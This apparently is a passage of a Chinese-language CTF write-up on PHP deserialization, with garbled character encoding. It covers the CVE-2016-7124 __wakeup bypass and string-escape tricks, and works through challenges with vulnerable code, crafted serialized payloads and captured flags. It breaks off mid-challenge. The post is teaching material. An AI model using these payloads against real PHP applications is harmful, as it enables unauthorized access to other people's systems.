title="__wakeupç»•è¿‡"></a>__wakeupç»•è¿‡</h3><p>è¿™ä¸ªå…¶å®æ˜¯ä¸ªCVE,CVE-2016-7124</p><p>å½±å“ç‰ˆæœ¬php5&lt;5.6.25,php7&lt;7.010</p><p>ç®€å•æè¿°å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</p><p>è€Œé­”æœ¯æ–¹æ³•__wakeupæ‰§è¡Œunserialize()æ—¶ï¼Œ<strong>å…ˆ</strong>ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p><p>æˆ‘ä»¬æœ¬åœ°å®éªŒä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;è§¦å‘__construct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;è§¦å‘__wakeup&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115227872-1700990458631-263.png"></p><p>å…ˆåºåˆ—åŒ–ä¸€ä¸‹ï¼Œè§¦å‘äº†___constructï¼Œå°†åºåˆ—åŒ–çš„å†…å®¹æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çœ‹ä¸€çœ‹</p><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115556904-1700990458631-264.png"></p><blockquote><p>è¿™æ ·åˆ™è§¦å‘äº†__wake,æˆ‘ä»¬å°†O:1:â€Aâ€:2:{s:1:â€aâ€;s:17:â€è§¦å‘__constructâ€;} æŠŠå¯¹è±¡ä¸ªæ•°æ”¹ä¸º2</p></blockquote><p>è§¦å‘äº†__construct,ç»•è¿‡äº†wakeup</p><h3 id="ååºåˆ—åŒ–é€ƒé€¸é—®é¢˜"><a href="#ååºåˆ—åŒ–é€ƒé€¸é—®é¢˜" class="headerlink" title="ååºåˆ—åŒ–é€ƒé€¸é—®é¢˜"></a>ååºåˆ—åŒ–é€ƒé€¸é—®é¢˜</h3><p>é€ƒé€¸é—®é¢˜çš„æœ¬è´¨æ˜¯æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´</p><p>æ‰€ä»¥ä¼šæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ç”±é•¿å˜çŸ­,ä¸€ç§æ˜¯ç”±çŸ­å˜é•¿ï¼›}</p><h3 id="ç”±é•¿å˜çŸ­"><a href="#ç”±é•¿å˜çŸ­" class="headerlink" title="ç”±é•¿å˜çŸ­"></a>ç”±é•¿å˜çŸ­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:27:â€abcâ€;s:2:â€v2â€;s:3:â€123â€;}</p><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:27:â€**abcâ€;s:2:â€v2â€;s:3:â€**s:2:â€v3â€;s:3:â€123â€;}â€;}</p><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:27:â€abc<del>system()system()system()</del>â€œ;s:2:â€v2â€;s:ï¼Ÿï¼Ÿ:â€1234567â€;s:2:â€v3â€;N;}â€;}</p><p>{s:2:â€v1â€;s:27:â€<strong>abcâ€;s:2:â€v2â€;s:21:â€1234567</strong>â€œ;s:2:â€v3â€;N;}â€;}</p></blockquote><h3 id="ç”±çŸ­å˜é•¿"><a href="#ç”±çŸ­å˜é•¿" class="headerlink" title="ç”±çŸ­å˜é•¿"></a>ç”±çŸ­å˜é•¿</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:2:â€lsâ€;s:2:â€v2â€;s:3:â€123â€;}</p><p>&#x2F;O:1:â€Aâ€:2:{s:2:â€v1â€;s:2:â€pwdâ€;s:2:â€v2â€;s:3:â€123â€;}</p><p>å­—ç¬¦ä¸²å¢å¤šï¼Œä¼šæŠŠæœ«å°¾çš„å­—ç¬¦ä¸²æŒ¤å‡ºæ¥ï¼Œ</p><p>å°±å¯ä»¥åˆ©ç”¨æŒ¤å‡ºæ¥çš„å­—ç¬¦ä¸²æ¥æ„é€ æˆ‘ä»¬åˆ©ç”¨çš„åŠŸèƒ½æ€§ä»£ç </p><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:2:â€pw<strong>dâ€;s:2:â€v3â€;s:3:â€wwwâ€;}</strong>;â€s:2:â€v2â€;s:3:â€123â€;}</p><p>è¦åå‡ºè¿™äº›å­—ç¬¦dâ€;s:2:â€v3â€;s:3:â€wwwâ€;},ä½¿ç»“æ„å®Œæ•´ï¼Œå¹¶ä¸”å¯ä»¥å§åºåˆ—åŒ–ç»“æŸæ‰ï¼ŒåŸæœ¬çš„é‚£äº›å°±ä¸ç®¡äº†</p><p>å¢åŠ äº†22ä½ä¸€ä¸ªlsï¼Œè½¬æ¢ä¸ºpwd,å¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œéœ€è¦è½¬æ¢22ä¸ªå­—ç¬¦</p><p>O:1:â€Aâ€:2:{s:2:â€v1â€;s:66:â€lslslslslslslslslslslslslslslslslslslslslslsâ€;s:2:â€v3â€;s:3:â€wwwâ€;}ï¼›â€s:2:â€v2â€;s:3:â€123â€;}</p></blockquote><p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804134635993-1700990458631-266.png"></p><p>ä¾‹é¢˜ï¼šå­—ç¬¦ä¸²å¢å¤š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;escaping&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;N;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>O:4:â€testâ€:2:{s:4:â€userâ€;N;<strong>s:4:â€passâ€;s:8:â€escapingâ€;}</strong>â€œ;</p><p>O:4:â€testâ€:2:{s:4:â€userâ€;s:3:â€phpâ€;<strong>s:4:â€passâ€;s:8:â€escapingâ€;}</strong>â€œ;</p><p>O:4:â€testâ€:2:{s:4:â€userâ€;s:3:â€php**â€;s:4:â€passâ€;s:8:â€escapingâ€;}**â€;</p><p>O:4:â€testâ€:2:{s:4:â€userâ€;s:116:â€phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpâ€;s:4:â€passâ€;s:8:â€escapingâ€;}â€;</p><p>O:4:â€testâ€:2:{s:4:â€userâ€;s:116:â€hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack**â€;s:4:â€passâ€;s:8:â€escapingâ€;}**â€;</p><p>æäº¤phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpâ€;s:4:â€passâ€;s:8:â€escapingâ€;}å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²å‡å°‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;qlnu&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:4:&quot;qlnu&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>O:4:â€testâ€:3:{s:4:â€userâ€;s:4:â€flagâ€;s:4:â€passâ€;s:4:â€qlnuâ€;s:3:â€vipâ€;b:1;} </p><p>æ€è·¯ï¼šè¿™é“é¢˜ç›®ä¸­flagä¼šè¢«æ›¿æ¢æˆhkï¼Œä¼šé€ æˆå­—ç¬¦ä¸²å‡å°‘ï¼Œå°±ä¼šå¾€ååƒï¼Œæˆ‘ä»¬è¦çŸ¥é“å¾€ååƒå¤šå°‘ä¸ªï¼Œåœ¨è¿™æ®µä»£ç é‡ŒVIPçš„å€¼ä¸å¯ä»¥åŠ¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹qlnuçš„å€¼æ¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸     ç›®æ ‡ä»£ç â€;s:4:â€passâ€;s:4:â€</p><p>è¿™é‡Œå°±ä¼šé€ æˆæˆå‘˜å±æ€§å°‘ä¸€ä¸ªï¼Œ é‚£ä¹ˆæˆ‘ä»¬æœ€ç»ˆçš„é€ƒé€¸ä»£ç è¦æ˜¯â€;s:4:â€passâ€;s:4:â€qlnuâ€;s:3:â€vipâ€;b:1;}ï¼Œä¿è¯æˆå‘˜å±æ€§ä¸ä¼šå°‘</p><p>æ¥åˆ¤æ–­è¦åƒçš„å­—ç¬¦ä¸²</p><p>â€œ;s:4:â€passâ€;s:4:â€     19ä½</p><p>flagåˆ°hkï¼Œåƒä¸€æ¬¡å°‘2ä¸ªï¼Œæœ€å°‘è¦åƒ10æ¬¡ï¼Œå°‘ä¸€ä½ï¼Œåé¢è¡¥ä¸€ä¸‹å°±å¥½äº†<strong>aâ€;s:4:â€passâ€;s:4:â€qlnuâ€;s:3:â€vipâ€;b:1;}</strong></p><p>ä¼ å‚å°±æ˜¯è®©userçš„å€¼ä¸ºflagflagflagflagflagflagflagflagflagflag</p><p>passçš„å€¼å°±æ˜¯aâ€;s:4:â€passâ€;s:4:â€qlnuâ€;s:3:â€vipâ€;b:1;}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;</span><br></pre></td></tr></table></figure><h2 id="phpååºåˆ—åŒ–é¢˜ç›®"><a href="#phpååºåˆ—åŒ–é¢˜ç›®" class="headerlink" title="phpååºåˆ—åŒ–é¢˜ç›®"></a>phpååºåˆ—åŒ–é¢˜ç›®</h2><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>)   ;</span><br><span class="line"><span class="comment">//code=O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>__wake upç»•è¿‡</p><p>åœ¨ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ä¸çœŸå®å­˜åœ¨çš„å‚æ•°ä¸ªæ•°ä¸åŒæ—¶ä¼šè·³è¿‡æ‰§è¡Œï¼Œå³å½“å‰å‡½æ•°ä¸­åªæœ‰ä¸€ä¸ªå‚æ•°$flagï¼Œè‹¥ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å‚æ•°ä¸ªæ•°ä¸º2å³å¯ç»•è¿‡ã€‚</p><p>?code&#x3D;O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; 